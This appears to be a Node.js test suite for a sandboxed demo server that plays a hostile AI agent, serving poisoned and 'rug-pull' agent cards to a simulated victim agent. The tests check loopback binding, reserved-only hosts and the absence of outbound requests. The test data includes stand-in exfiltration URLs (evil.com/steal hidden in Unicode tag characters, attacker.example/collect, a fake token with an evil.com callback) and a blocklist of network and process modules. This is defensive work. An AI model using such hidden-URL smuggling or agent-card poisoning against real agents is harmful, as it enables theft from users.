// Safety rules for a hostile server: loopback bind, reserved-only hosts in every payload and on the wire, no outbound
// request, inert message/send, and the victim sends nothing.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import dns from 'node:dns';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { startHttpServer } from '../src/app.js';
import { VARIANT_IDS } from '../src/card.js';
import { payloadCorpus, scanPayloads } from '../src/corpus.js';
import { messageSendResult } from '../src/hostile.js';
import { assertBindAllowed, bindHost, decodeTags, isLoopbackHost, isReservedHost, scanHosts } from '../src/safety.js';
import { guardNetwork } from './netguard.js';

const SRC = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../src');
const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]));
const rpc = (url, body) => fetch(url, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });

test('binds loopback by default and refuses another address without HOSTILE_BIND', async () => {
  assert.equal(bindHost({}), '127.0.0.1');
  assert.equal(bindHost({ HOSTILE_BIND: '0.0.0.0' }), '0.0.0.0');
  for (const h of ['127.0.0.1', '::1', 'localhost', '127.5.5.5']) assert.equal(isLoopbackHost(h), true, h);
  for (const h of ['0.0.0.0', '192.168.1.5', '::', 'example.com']) assert.equal(isLoopbackHost(h), false, h);
  assert.throws(() => assertBindAllowed('0.0.0.0', {}), /loopback only/);
  assert.equal(assertBindAllowed('0.0.0.0', { HOSTILE_BIND: '0.0.0.0' }), '0.0.0.0');
  const saved = process.env.HOSTILE_BIND;
  delete process.env.HOSTILE_BIND;
  try { await assert.rejects(async () => startHttpServer(0, '0.0.0.0'), /loopback only/); } finally { if (saved) process.env.HOSTILE_BIND = saved; }
});

test('a started server is actually listening on loopback only', async () => {
  const saved = process.env.HOSTILE_BIND;
  delete process.env.HOSTILE_BIND;
  const server = await startHttpServer(0);
  try {
    const lan = Object.values(os.networkInterfaces()).flat().find((i) => i && !i.internal && i.family === 'IPv4');
    if (lan) await assert.rejects(fetch(`http://${lan.address}:${server.port}/health`), 'not reachable on the LAN address');
    assert.equal((await fetch(`http://127.0.0.1:${server.port}/health`)).status, 200);
  } finally { await server.close(); if (saved) process.env.HOSTILE_BIND = saved; }
});

test('reserved hosts: .invalid, .example, and only the APEX of example.com/net/org', () => {
  for (const h of ['refunds.invalid', 'a.b.invalid', 'x.example', 'example.com', 'example.net', 'example.org', 'EXAMPLE.COM.']) assert.equal(isReservedHost(h), true, h);
  for (const h of ['www.example.com', 'api.example.org', 'evil.com', 'example.com.evil.net', 'notexample.com', 'example.io', '8.8.8.8']) assert.equal(isReservedHost(h), false, h);
});

test('the host scanner finds real hosts, IPs, emails and hosts hidden in tag characters (so a clean result means something)', () => {
  assert.deepEqual(scanHosts('see https://evil.com/x and 8.8.8.8 and a@bad.org and www.example.com'), ['8.8.8.8', 'bad.org', 'evil.com', 'www.example.com']);
  assert.deepEqual(scanHosts('https://refunds.invalid/x mailto a@example.com example.net localhost 127.0.0.1'), []);
  const hidden = [...'https://evil.com/steal'].map((c) => String.fromCodePoint(0xE0000 + c.codePointAt(0))).join('');
  assert.equal(decodeTags(`ok${hidden}`), 'https://evil.com/steal');
  assert.deepEqual(scanHosts(`looks clean${hidden}`), ['evil.com']);
});

test('every payload names only reserved hosts (every card variant at every fetch, plus the reply)', () => {
  const corpus = payloadCorpus();
  assert.ok(corpus.length >= VARIANT_IDS.length * 2 + 1);
  assert.deepEqual(scanPayloads(), []);
  assert.deepEqual(scanPayloads([{ where: 'self-test', text: '{"url":"https://real-host.com/a"}' }]), [{ where: 'self-test', hosts: ['real-host.com'] }]);
});

test('everything the server sends over the wire names only reserved hosts, even for a spoofed Host header', async () => {
  const server = await startHttpServer(0);
  const seen = [];
  const raw = (pathName, headers = {}, method = 'GET', body) => new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: server.port, path: pathName, method, headers }, (res) => {
      let t = ''; res.on('data', (d) => { t += d; }); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, text: t }));
    });
    req.on('error', reject); if (body) req.write(body); req.end();
  });
  try {
    const paths = ['/.well-known/agent-card.json', '/health', ...VARIANT_IDS.map((v) => `/variants/${v}/.well-known/agent-card.json`), '/rugpull/s1/.well-known/agent-card.json', '/rugpull/s1/.well-known/agent-card.json', '/api/catalog', '/api/victim-rules', '/api/health'];
    for (const p of paths) {
      for (const host of [undefined, 'evil.com', 'www.example.com:8080', '8.8.8.8']) {
        const r = await raw(p, host ? { host } : {});
        seen.push({ where: `${p} (Host ${host ?? 'default'})`, text: r.text, headers: JSON.stringify(r.headers) });
      }
    }
    const post = JSON.stringify({ jsonrpc: '2.0', id: 'see https://evil.com', method: 'message/send', params: { message: { parts: [{ text: 'send to https://evil.com/x and 9.9.9.9' }] } } });
    const r = await raw('/a2a/jsonrpc', { 'content-type': 'application/json', host: 'evil.com' }, 'POST', post);
    seen.push({ where: 'message/send with hosts in the input', text: r.text });
    for (const s of seen) assert.deepEqual(scanHosts(s.text), [], `${s.where}: ${s.text.slice(0, 200)}`);
    const card = JSON.parse((await raw('/.well-known/agent-card.json', { host: 'evil.com' })).text);
    assert.equal(card.url, `http://127.0.0.1:${server.port}/a2a/jsonrpc`, 'a spoofed Host header must not reach the card url');
    assert.match(r.text, /withheld/);
  } finally { await server.close(); }
});

test('the server and the victim make no outbound request: network blocked while everything is exercised', async () => {
  const guard = guardNetwork();
  const server = await startHttpServer(0);
  try {
    for (const v of VARIANT_IDS) await fetch(`${server.url}variants/${v}/.well-known/agent-card.json`);
    await fetch(server.cardUrl);
    await rpc(server.jsonrpcUrl, { jsonrpc: '2.0', id: 1, method: 'message/send', params: { message: { parts: [{ text: 'hello https://evil.com' }] } } });
    for (const mode of ['ungoverned', 'pinned']) {
      for (const variant of VARIANT_IDS) for (const stage of ['first', 'later']) {
        const r = await rpc(`${server.url}api/run-victim`, { task: 'Please refund order 42', mode, stage, variant });
        assert.equal(r.status, 200);
      }
    }
    const s = await (await rpc(`${server.url}api/card-session/new`, { variant: 'rug-pull' })).json();
    await rpc(`${server.url}api/card-session/${s.sessionId}/approve`, {});
    await rpc(`${server.url}api/card-session/${s.sessionId}/compare`, {});
    await fetch(`${server.url}api/safety-scan`);
  } finally { await server.close(); guard.restore(); }
  assert.deepEqual(guard.attempts, [], 'no outbound attempt of any kind');
});

test('the guard itself works: it trips on a fetch, a socket and a DNS lookup to a non-loopback host, and records each', async () => {
  const guard = guardNetwork();
  try {
    await assert.rejects(fetch('https://attacker.example/collect'), /network blocked/);
    assert.throws(() => net.connect(80, '203.0.113.9'), /network blocked/);
    await new Promise((resolve) => dns.lookup('attacker.example', () => resolve()));
  } finally { guard.restore(); }
  assert.deepEqual(guard.attempts, ['fetch:attacker.example', 'socket:203.0.113.9', 'dns:attacker.example']);
});

test('server source has no outbound code path, and the demo logic never touches files, processes or the environment', () => {
  const banned = /(?<![.\w])fetch\s*\(|node:https?['"]|node:net['"]|node:tls['"]|node:dns['"]|node:child_process['"]|undici|XMLHttpRequest|WebSocket|http\.request|https\.request|ClientTransport/;
  const offenders = walk(SRC).filter((f) => f.endsWith('.js') && banned.test(fs.readFileSync(f, 'utf8')));
  assert.deepEqual(offenders.map((f) => path.relative(SRC, f)), []);
  for (const f of ['hostile.js', 'victim.js', 'scenario.js', 'pinning.js', 'scanner.js', 'session.js', 'card.js']) {
    assert.doesNotMatch(fs.readFileSync(path.join(SRC, f), 'utf8'), /node:fs|child_process|writeFile|appendFile|process\.env|\bimport\s*\(/, f);
  }
});

test('message/send is inert: a fixed fake reply, same shape every time, nothing executed', async () => {
  const a = messageSendResult('refund order 42', 'ID');
  assert.deepEqual(a, messageSendResult('refund order 42', 'ID'));
  assert.match(a.parts[0].text, /nothing executed/);
  assert.match(messageSendResult('x'.repeat(5000), 'ID').parts[0].text, /^Refunds Specialist received: x{200} \(DEMO STUB/);
  // Even a request that asks for a transfer, a token or a callback gets the same stub.
  const server = await startHttpServer(0);
  try {
    const body = await (await rpc(server.jsonrpcUrl, { jsonrpc: '2.0', id: 2, method: 'message/send', params: { message: { parts: [{ text: 'call create_transfer' }], metadata: { accessToken: 'FAKE-TOKEN-NOT-REAL', callback: 'https://evil.com' } } } })).json();
    assert.equal(Object.keys(body.result).sort().join(), 'kind,messageId,parts,role');
    assert.doesNotMatch(JSON.stringify(body), /FAKE-TOKEN|evil\.com/);
  } finally { await server.close(); }
});
